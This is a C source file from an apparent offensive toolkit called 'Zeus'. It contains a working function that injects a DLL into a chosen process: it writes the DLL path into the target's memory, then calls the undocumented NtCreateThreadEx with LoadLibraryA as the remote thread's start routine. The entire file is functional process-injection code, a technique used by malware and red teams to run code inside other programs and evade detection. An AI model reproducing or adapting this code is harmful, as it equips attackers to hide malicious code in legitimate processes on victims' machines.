/*
* ZeusCreateRemoteThreadEx : Contains the routines for dll
* injection using NtCreateThreadEx
* Some Thanks to InjectAllTheThings Project
*
* Written By : @Ice3man
* Email : EthanTom543@gmail.com
*
* (C) Ice3man
*/
#include "Zeus.h"

/*
* ZeusNtCreateThreadEx : Injects A Dll using NtCreateThreadEx
* All prior task is same and only the function injecting is
* different.
*
* @Arguments :
*	@ProcID : Process ID Of Target Process
*	@szDllLocation : Location of Dll String
*
* @Return : 
*	@void
*/
int ZeusNtCreateThreadEx(int ProcID, char *szDllLoc)
{
	HANDLE hRemoteThread = NULL;
	NtCreateThreadExBuffer ntbuffer;
	LARGE_INTEGER dwTmp1 = { 0 };
	LARGE_INTEGER dwTmp2 = { 0 };

	memset(&ntbuffer, 0, sizeof(NtCreateThreadExBuffer));

	HANDLE hProcess = ZeusOpenProcess(ProcID);
	LPVOID arg = ZeusWriteDllStrMemory(szDllLoc, hProcess);

	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (addr == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Error : Could not get Library Address !");
#endif
		ExitProcess(1);
	}
	printf("\n[+] Got Address Of LoadLibraryA Successfully !");
	

	PTHREAD_START_ROUTINE ntCreateThreadExAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	if (ntCreateThreadExAddr == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Error: Could not find NtCreateThreadEx. !");
#endif
		ExitProcess(1);
	}

	if (ntCreateThreadExAddr)
	{
		ntbuffer.Size = sizeof(struct NtCreateThreadExBuffer);
		ntbuffer.Unknown1 = 0x10003;
		ntbuffer.Unknown2 = 0x8;
		ntbuffer.Unknown3 = (DWORD*)&dwTmp2;
		ntbuffer.Unknown4 = 0;
		ntbuffer.Unknown5 = 0x10004;
		ntbuffer.Unknown6 = 4;
		ntbuffer.Unknown7 = (DWORD*)&dwTmp1;
		ntbuffer.Unknown8 = 0;

		LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx)ntCreateThreadExAddr;

		NTSTATUS status = funNtCreateThreadEx(&hRemoteThread,0x1FFFFF,NULL,hProcess, (LPTHREAD_START_ROUTINE) addr,(LPVOID)arg,FALSE,NULL,NULL,NULL,NULL);

		if (!NT_SUCCESS(status))		
		{
#ifdef _DEBUG_
			printf("\n[!] Error Occured Creating A Thread");
#endif 
			ExitProcess(1);
		}
		else
		{
			printf("\n[+] Successfully Created Remote Thread !");
			//WaitForSingleObject(hRemoteThread, INFINITE);
		}
	}

	if (hRemoteThread != NULL)
		CloseHandle(hRemoteThread);

	if (hProcess != NULL)
		CloseHandle(hProcess);

	ExitProcess(0);
}